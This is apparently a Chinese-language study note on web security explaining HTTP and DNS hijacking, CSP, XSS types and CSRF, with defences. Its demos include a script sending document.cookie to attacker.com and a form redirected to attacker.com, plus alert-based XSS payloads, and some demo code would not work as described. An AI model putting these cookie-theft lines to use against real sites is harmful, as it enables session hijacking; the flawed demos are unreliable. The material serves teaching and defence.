# HTTP 劫持、DNS 劫持与 XSS

- http 劫持是指攻击者在客户端和服务器之间同时建立了连接通道，通过某种方式，让客户端请求发送到自己的服务器，然后自己就拥有了控制响应内容的能力，从而给客户端展示错误的信息，比如在页面中加入一些广告内容。

- DNS 劫持是指攻击者劫持了 DNS 服务器，获得了修改 DNS 解析记录的权限，从而导致客户端请求的域名被解析到了错误的 IP 地址，攻击者通过这种方式窃取用户资料或破坏原有正常服务。

- XSS 是指跨站脚本攻击。攻击者利用站点的漏洞，在表单提交时，在表单内容中加入一些恶意脚本，当其他正常用户浏览页面，而页面中刚好出现攻击者的恶意脚本时，脚本被执行，从而使得页面遭到破坏，或者用户信息被窃取。
  要防范 XSS 攻击，需要在服务器端过滤脚本代码，将一些危险的元素和属性去掉或对元素进行 HTML 实体编码。

# 什么是 CSP？

CSP（Content-Security-Policy）指的是内容安全策略，它的本质是建立一个白名单，告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截由浏览器自己来实现。

通常有两种方式来开启 CSP

- 一种是设置 HTTP 首部中的`Content-Security-Policy`
- 一种是设置 meta 标签的方式
   <meta http-equiv="Content-Security-Policy">


CSP 也是解决 XSS 攻击的一个强力手段

# XSS：Cross-site Scripting

- XSS 是指跨站脚本攻击。攻击者利用站点的漏洞，在表单提交时，在表单内容中加入一些恶意脚本，当其他正常用户浏览页面，而页面中刚好出现攻击者的恶意脚本时，脚本被执行，从而使得页面遭到破坏，或者用户信息被窃取。

- 攻击者对客户端网页注入的恶意脚本一般包括 JavaScript，有时也会包含 HTML 和 Flash。有很多种方式进行 XSS 攻击，但它们的共同点为：将一些隐私数据像 cookie、session 发送给攻击者，将受害者重定向到一个由攻击者控制的网站，在受害者的机器上进行一些恶意操作。

- 要防范 XSS 攻击，需要在服务器端过滤脚本代码，将一些危险的元素和属性去掉或对元素进行 HTML 实体编码。

```javascript
<!-- index.html -->
<!DOCTYPE html>
<html>
<head>
  <title>XSS Attack Demo</title>
</head>
<body>
  <h1>XSS Attack Demo</h1>
  <div id="content"></div>
  <script src="payload.js"></script>
</body>
</html>


// payload.js
const maliciousScript = `
  const xhr = new XMLHttpRequest();
  xhr.open('GET', 'http://attacker.com/steal-cookie?cookie=' + document.cookie, true);
  xhr.send();
`;

document.getElementById('content').innerHTML = maliciousScript;

```

在上述示例中，恶意脚本 payload.js 被注入到页面中。该脚本通过 XMLHttpRequest 发送 GET 请求，将页面中的 Cookie 信息发送给攻击者控制的服务器。

## XSS 攻击可以分为 3 类：反射型（非持久型）、存储型（持久型）、基于 DOM。

1. 反射型 （Reflected XSS ） 发出请求时，XSS 代码出现在 url 中，作为输入提交到服务器端，服务器端解析后响应，XSS 代码随响应内容一起传回给浏览器，最后浏览器解析执行 XSS 代码。这个过程像一次反射，所以叫反射型 XSS。

假设有一个搜索页面，用户的搜索词通过 URL 参数传递，如 https://example.com/search?q=keyword。
如果服务器将用户输入的搜索词直接反射在页面上，攻击者可以通过构造恶意的 URL 来实施攻击。例如：

```javascript
https://example.com/search?q=<script>alert('XSS')</script>
```

如果这个 URL 被访问，服务器将 <script>alert('XSS')</script> 直接嵌入到 HTML 中，从而弹出一个警告框。

2. 存储型 Stored XSS 和 Reflected XSS 的差别就在于，具有攻击性的脚本被保存到了服务器端（数据库，内存，文件系统）并且可以被普通用户完整的从服务的取得并执行，从而获得了在网络上传播的能力。

在一个论坛应用中，用户可以提交评论。如果应用没有正确地清理用户提交的数据，攻击者可以提交包含恶意脚本的评论。例如，攻击者可能会提交以下评论：

```javascript
<script>alert('XSS')</script>
```

该脚本存储在服务器上，并且每当任何用户浏览包含该评论的页面时，脚本都会被执行，导致 XSS 攻击。

3. DOM 型 （DOM-based or local XSS） 即基于 DOM 或本地的 XSS 攻击：其实是一种特殊类型的反射型 XSS，它是基于 DOM 文档对象模型的一种漏洞。可以通过 DOM 来动态修改页面内容，从客户端获取 DOM 中的数据并在本地执行。基于这个特性，就可以利用 JS 脚本来实现 XSS 漏洞的利用。

假设有一个网页，用户可以通过输入框输入内容，然后点击按钮将内容显示在页面上。攻击者在输入框中输入了恶意脚本。

```html
<!DOCTYPE html>
<html>
  <head>
    <title>DOM-based XSS Example</title>
  </head>
  <body>
    <input type="text" id="userInput" />
    <button onclick="displayInput()">Submit</button>
    <div id="output"></div>

    <script>
      function displayInput() {
        const userInput = document.getElementById("userInput").value;
        document.getElementById("output").innerHTML = userInput;
      }
    </script>
  </body>
</html>
```

攻击者的输入：

<script>alert('XSS Attack!');</script>

用户点击按钮后，页面的 JavaScript 代码将输入内容直接插入到 DOM 中：

```html
<div id="output">
  <script>
    alert("XSS Attack!");
  </script>
</div>
```

## 防范手段：

1. 输入过滤
2. 输出过滤
3. 加 httponly 请求头 锁死 cookie (浏览器将禁止页面的 Javascript 访问带有 HttpOnly 属性的 Cookie)
4. CSP (Content Security Policy)

# CSRF：Cross-site request forgery

跨站请求伪造

1.  用户打开浏览器，访问受信任网站 A，输入用户名和密码请求登录网站 A；
2.  在用户信息通过验证后，网站 A 产生 Cookie 信息并返回给浏览器，此时用户登录网站 A 成功，可以正常发送请求到网站 A；
3.  用户未退出网站 A 之前，在同一浏览器中，打开一个 TAB 页访问网站 B；
4.  网站 B 接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点 A；
5.  浏览器在接收到这些攻击性代码后，根据网站 B 的请求，在用户不知情的情况下携带 Cookie 信息，向网站 A 发出请求。网站 A 并不知道该请求其实是由 B 发起的，所以会根据用户 C 的 Cookie 信息以 C 的权限处理该请求，导致来自网站 B 的恶意代码被执行。

```javascript
<!-- index.html -->
<!DOCTYPE html>
<html>
<head>
  <title>CSRF Attack Demo</title>
</head>
<body>
  <h1>CSRF Attack Demo</h1>
  <form id="transfer-form" action="http://bank.com/transfer" method="POST">
    <input type="hidden" name="amount" value="10000">
    <input type="submit" value="Transfer">
  </form>
  <script src="payload.js"></script>
</body>
</html>
```

```javascript
// payload.js
const maliciousScript = `
  const form = document.getElementById('transfer-form');
  form.action = 'http://attacker.com/steal-data';
  form.submit();`;

eval(maliciousScript);
```

在上述示例中，恶意脚本 payload.js 被执行。该脚本修改了表单 transfer-form 的目标地址为攻击者控制的服务器，并提交表单。当用户点击"Transfer"按钮时，实际上会向攻击者服务器发送用户的敏感数据。

防御 CSRF 攻击有多种手段：

- 不使用 `cookie`
- 为表单添加校验的 `token` 校验
- cookie 中使用 `sameSite`字段
- 服务器检查 `referer` 字段 (记录了该 HTTP 请求的来源地)
